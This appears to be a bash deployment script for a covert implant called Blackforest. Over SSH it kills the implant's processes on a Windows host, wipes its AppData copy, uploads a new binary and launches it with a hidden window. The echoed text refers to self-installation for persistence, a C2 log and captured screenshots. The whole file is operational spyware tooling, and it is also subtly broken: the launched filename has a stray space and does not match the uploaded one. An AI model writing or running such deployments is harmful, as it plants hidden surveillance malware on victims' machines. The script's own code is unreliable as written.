#!/bin/bash
# Final automated deployment of bug-fixed agent
# This ensures the AppData copy gets updated too

echo "=========================================="
echo "FINAL BUG-FIXED DEPLOYMENT"
echo "=========================================="
echo ""

TARGET="pss trust@192.168.0.6"

echo "[1/4] Killing all Blackforest processes..."
ssh "$TARGET" "Stop-Process -Name 'Blackforest' -Force -ErrorAction SilentlyContinue"
sleep 2

echo "[2/4] Removing old AppData installation..."
ssh "$TARGET" "Remove-Item \"\$env:APPDATA\\Blackforest\" -Recurse -Force -ErrorAction SilentlyContinue"
sleep 1

echo "[3/4] Uploading bug-fixed binary..."
scp bin/Blackforest.exe "$TARGET:Downloads/Blackforest.exe"

echo "[4/4] Starting bug-fixed agent..."
ssh "$TARGET" "Start-Process \"\$env:USERPROFILE\\Downloads\\Black forest.exe\" -WindowStyle Hidden"

echo ""
echo "[+] DEPLOYMENT COMPLETE!"
echo "[*] Agent will auto-install to AppData with bug-fixed version"
echo "[*] Wait 30 seconds then check for:"
echo "    - New startup message in c2/blackforest_logs.txt"
echo "    - Screenshots in c2/screenshot_*.jpg"
echo ""
